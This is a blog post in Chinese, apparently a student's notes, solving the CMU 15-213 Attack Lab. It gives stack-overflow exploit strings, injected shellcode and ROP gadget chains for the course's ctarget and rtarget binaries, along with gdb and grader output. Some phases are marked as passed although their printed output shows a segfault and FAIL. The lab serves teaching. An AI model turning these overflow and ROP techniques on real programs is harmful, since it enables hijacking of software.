<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cynosure.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="15-213 Attack Lab 作题笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="CMU-15-213-Lab3-Attack-Lab">
<meta property="og:url" content="http://cynosure.github.io/Cynosure.github.io/2022/01/28/CMU-15-213-Lab3-Attack-Lab/index.html">
<meta property="og:site_name" content="Cynosure&#39;s Blog">
<meta property="og:description" content="15-213 Attack Lab 作题笔记">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220129004851.png">
<meta property="article:published_time" content="2022-01-28T16:51:02.000Z">
<meta property="article:modified_time" content="2022-01-28T16:53:21.372Z">
<meta property="article:author" content="Cynosure">
<meta property="article:tag" content="15-213">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220129004851.png">

<link rel="canonical" href="http://cynosure.github.io/Cynosure.github.io/2022/01/28/CMU-15-213-Lab3-Attack-Lab/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>CMU-15-213-Lab3-Attack-Lab | Cynosure's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Cynosure's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://cynosure.github.io/Cynosure.github.io/2022/01/28/CMU-15-213-Lab3-Attack-Lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cynosure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cynosure's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CMU-15-213-Lab3-Attack-Lab
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-01-28 08:51:02 / Modified: 08:53:21" itemprop="dateCreated datePublished" datetime="2022-01-28T08:51:02-08:00">2022-01-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><img src="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220129004851.png"></p>
<p>15-213 Attack Lab 作题笔记</p>
<span id="more"></span>
<h1 id="题目总览"><a href="#题目总览" class="headerlink" title="题目总览"></a>题目总览</h1><table>
<thead>
<tr>
<th>Phase</th>
<th>Program</th>
<th>Level</th>
<th>Method</th>
<th>Function</th>
<th>Points</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>CTARGET</td>
<td>1</td>
<td>CI</td>
<td>touch1</td>
<td>10</td>
</tr>
<tr>
<td>2</td>
<td>CTARGET</td>
<td>2</td>
<td>CI</td>
<td>touch2</td>
<td>25</td>
</tr>
<tr>
<td>3</td>
<td>CTARGET</td>
<td>3</td>
<td>CI</td>
<td>touch3</td>
<td>25</td>
</tr>
<tr>
<td>4</td>
<td>RTARGET</td>
<td>2</td>
<td>ROP</td>
<td>touch2</td>
<td>35</td>
</tr>
<tr>
<td>5</td>
<td>RTARGET</td>
<td>3</td>
<td>ROP</td>
<td>touch3</td>
<td>5</td>
</tr>
</tbody></table>
<center>CI: Code injection</center>
<center>ROP: Return-oriented programming</center>

<center>Figure 1: Summary of attack lab phases</center>

<p>如表格所示，本次 lab 有 5 个 pahse ，3 g个是代码注入，一个的 <code>Return-oriient programing</code> 返回式导向编程。</p>
<p>自这个 lab 开始，以后的 lab 都需要参考 writeup 才能知道题目要求是什么，知道该做什么</p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><blockquote>
<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p>
</blockquote>
<p>该 pahse 要求我们在存在栈溢出的 <code>getbuf</code> 函数中修改他的返回地址到 <code>touch1</code> 函数，实现控制流劫持</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   <span class="number">0x00000000004017a8</span> &lt;+<span class="number">0</span>&gt;:	    <span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004017ac</span> &lt;+<span class="number">4</span>&gt;:	    <span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x00000000004017af</span> &lt;+<span class="number">7</span>&gt;:	    <span class="keyword">call</span>   <span class="number">0x401a40</span> &lt;Gets&gt;</span><br><span class="line">   <span class="number">0x00000000004017b4</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004017b9</span> &lt;+<span class="number">17</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004017bd</span> &lt;+<span class="number">21</span>&gt;:	<span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; p touch1</span><br><span class="line"><span class="number">$2</span> = &#123;void ()&#125; <span class="number">0x4017c0</span> &lt;touch1&gt;</span><br></pre></td></tr></table></figure>

<p>看看 getbuf 的汇编代码，与 touch1 知道输入数据起始地址距离栈上的返回地址有 0x28 个字节 所以我们先在栈上填充 0x28 个字节再填充 touch1 的返回地址即可</p>
<p>expolit.txt 文件内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ cat expolit.txt</span><br><span class="line">61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00</span><br></pre></td></tr></table></figure>


<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ cat expolit.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00</span><br></pre></td></tr></table></figure>

<p><strong>pahse1 pass</strong></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote>
<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p>
</blockquote>
<p>该 phase 要求我们劫持返回地址到 touch2 并且 通过 cookie 的验证，对应的 cookie 数值在我们下载的文件 <code>cookie.txt</code> 中，验证的方式是将传入函数的参数(储存在 rdi 寄存器中)与 cookie 比较。</p>
<p>依照所给 writeup 中所给的 Appendix B 方法我们可以使用 gcc 和 objdump 获取汇编代码对应产生的字节序列</p>
<p>通过阅读函数 <code>stable_launch</code> 代码我们知道 该程序映射了一片新内存区域 <code>0x55586000 - 0x55686000</code> 上，权限为可读可写可执行，且后面将其作为栈上的内存使用</p>
<p>所以我们输入该程序的数据是处在一段可执行内存区域，可以将 shellcode 写入该内存区域，并且劫持控制流到对应地址，实现 rdi 寄存器的写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ cat shellcode.s</span><br><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">❯ gcc -c shellcode.s</span><br><span class="line"></span><br><span class="line">❯ objdump -d shellcode.o</span><br><span class="line"></span><br><span class="line">shellcode.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>通过这样的命令我们可以知道汇编指令 <code>mov    $0x59b997fa,%rdi</code> 和 <code>ret</code> 对应的字节序列，且正好为 8 字节</p>
<p>接着使用 gdb 调试知道我们在 getbuf 函数中输入数据 存储的首地址为 <code>0x5561dc78</code></p>
<p>加上 touch2 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p touch2</span><br><span class="line">$1 = &#123;void (unsigned int)&#125; 0x4017ec &lt;touch2&gt;</span><br></pre></td></tr></table></figure>

<p>所以我们构造出这样的字节序列写入 expolit.txt 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */</span><br><span class="line">c3 /* ret */</span><br><span class="line">61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of shellcode */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* address of touch2 */</span><br></pre></td></tr></table></figure>

<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ cat expolit.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:ctarget:0:48 C7 C7 FA 97 B9 59 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><strong>phase2 pass</strong></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote>
<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p>
</blockquote>
<p>该 pahse 使用了 hexmatch 函数去比较 cookie 与 我们传入的参数，我们传入的参数是一个指针，所以需要比较的 cookie 的值我们需要预先写入某段内存区域中，可将其写入返回地址之后，这样数据在栈上便于我们通过偏移计算地址</p>
<p>构造出这样的字节序列写入 expolit.txt 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 dc 61 55 /* mov    $0x5561dcb8,%rdi */</span><br><span class="line">c3 /* ret */</span><br><span class="line">c3 /* ret */</span><br><span class="line">00 00 00 00 00 00 00 /* padding */</span><br><span class="line">61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of shellcode */</span><br><span class="line">80 dc 61 55 00 00 00 00 /* second ret */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* strings of cookie*/</span><br></pre></td></tr></table></figure>

<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ cat expolit.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 C3 C3 00 00 00 00 00 00 00 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 80 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p><strong>phase3 pass</strong></p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote>
<p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).</p>
</blockquote>
<p>该 phase 部分与 phase2 相同，不同的在于栈上不具有可执行权限，所以我们使用 rop 的方法去达到目的</p>
<p>使用 <code>ROPgadget</code> 工具找到 gadget <code>0x000000000040141b : pop rdi ; ret</code></p>
<p>构造出这样的字节序列写入 expolit.txt 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line">1b 14 40 00 00 00 00 00 /* pop rdi; ret */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* hex number of cookie */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* address of touch2 */</span><br></pre></td></tr></table></figure>

<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ cat expolit.txt | ./hex2raw | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:rtarget:0:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><strong>pahse4 pass</strong></p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
<p>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.</p>
</blockquote>
<p>你已经得到 95 分，如果你还有其他重要的事，就可以现在停下去做你该做的了。</p>
<p>&gt;_&lt; 很有趣的一段话，在保证学生学分的同时，不给予太大的压力。是一个十分人性的设计。</p>
<blockquote>
<p>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to<br>go beyond the normal expectations for the course.</p>
</blockquote>
<p>该 phase 要求与 phase3 相同，不过就是程序开启了栈不可执行，与栈地址随机化，但是实际上并不难</p>
<p>通过 ROPgadget 发现 gadget <code>0x0000000000401a06 : mov rax, rsp ; ret</code></p>
<p>构造出这样的字节序列写入 expolit.txt 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 /* padding */</span><br><span class="line"></span><br><span class="line">1b 14 40 00 00 00 00 00 /* pop rdi; ret */</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00 /* pop rsi ; ret */</span><br><span class="line">00 5A 60 00 00 00 00 00 /* 0x605A00 */</span><br><span class="line"></span><br><span class="line">30 0D 40 00 00 00 00 00 /* 0x400D30 */</span><br><span class="line">/* read(0, *0x605A00, number x) */</span><br><span class="line"></span><br><span class="line">1b 14 40 00 00 00 00 00 /* pop rdi; ret */</span><br><span class="line">00 5A 60 00 00 00 00 00 /* 0x605A00 bss 段区域*/</span><br><span class="line"></span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 */</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里做一个说明 在 <code>getbuf</code> 函数中，读取完输入之后 <code>rdx</code> 寄存器是一个地址，对应 read 语句参数中 <code>number x</code> 远远大于我们所需要输入数据的量，所以这里 的 read 读取数据会直到遇见 <code>\n</code> 结束</p>
<p>将如下数据写入 in.txt 文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 /* strings of cookie */</span><br></pre></td></tr></table></figure>

<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ ./hex2raw &lt; expolit.txt &gt; expolit_raw.txt</span><br><span class="line"></span><br><span class="line">❯ ./hex2raw &lt; in.txt &gt; out_raw.txt</span><br><span class="line"></span><br><span class="line">❯ ./rtarget -q -i expolit_raw.txt &lt; out_raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 1B 14 40 00 00 00 00 00 00 00 00 00 00 00 00 00 83 13 40 00 00 00 00 00 00 5A 60 00 00 00 00 00 30 0D 40 00 00 00 00 00 1B 14 40 00 00 00 00 00 00 5A 60 00 00 00 00 00 FA 18 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>这里解释一下为什么这样做</p>
<p>如果我们将 cookie 的字符串序列同样写在 expolit.txt 文件中，生成文件 expolit_raw.txt 。使用命令<code>./rtarget -q &lt; expolit_raw.txt</code> 去运行，在执行到 read 函数时不会往对应地址中读取任何数据，我也并不知道这是为什么，好在目标文件提供了 <code>-i</code> 这个参数从文件中读取数据，我们使用 <code>-i</code> 参数去读取文件 expolit_raw.txt中数据，这样在执行 read 函数从标准输入流中读取数据时，我们就可以手动输入对应的 cookie 字符串，可是手动输入会把 <code>\n</code> 计算在字符串内，无法比较通过，这时候就可以将其写入一个文件中，通过输入重定向方式输入 <code>\x00</code> 截断字符串 这也是 in.txt 文件最后为什么有一个 <code>00</code> 存在的原因</p>
<p><strong>phase5 pass</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这些题目来自 <code>Computer Systems: A Programmer&#39;s Perspective, 3/E (CS:APP3e)</code> 的 lab3 。</p>
<p>这部分内容对于学过一点 pwn 的我来说还是比较容易，cmu 的 <code>15-123</code> 的确也是一门不可多得的好课，通过做这两个实验，使我对汇编 objdump gdb 的认识也更近了一步。感觉虽然没能学到太多高深奥妙的东西，但是这种对于基础知识学习，将计算机基础打得更牢固的感觉也使我感到不错。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/15-213/" rel="tag"># 15-213</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/01/26/hello-world/" rel="prev" title="Hello World">
      <i class="fa fa-chevron-left"></i> Hello World
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E8%A7%88"><span class="nav-number">1.</span> <span class="nav-text">题目总览</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">1.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">1.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">1.5.</span> <span class="nav-text">level5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Cynosure</p>
